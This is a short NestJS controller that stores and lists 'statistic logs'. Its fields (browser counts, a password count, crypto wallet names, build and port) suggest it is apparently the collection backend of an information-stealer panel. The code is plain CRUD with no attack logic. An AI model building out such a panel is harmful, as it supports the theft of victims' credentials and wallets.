import { Body, Controller, Get, Post } from '@nestjs/common';
import { LogService } from './log.service';

@Controller("/statistic-logs")
export class LogController {
    constructor(private readonly logService: LogService) {}
  
    @Post()
    create(@Body() dto: {
        id: number,
        num: string,
        ip: { 
            i: string, 
            co: string, 
            countrycode: string 
        },
        browse: { 
            Edge: number, 
            Brave: number, 
            Opera: number, 
            Chrome: number, 
            Safari: number, 
            Firefox: number, 
            Vivaldi: number
        },
        passwords: number,
        wallets: string[],
        build: string,
        date: Date;
        port: string,
        }) {
        return this.logService.create(dto)
    }

    @Get()
    findMany() {
        return this.logService.findMany();
    }
}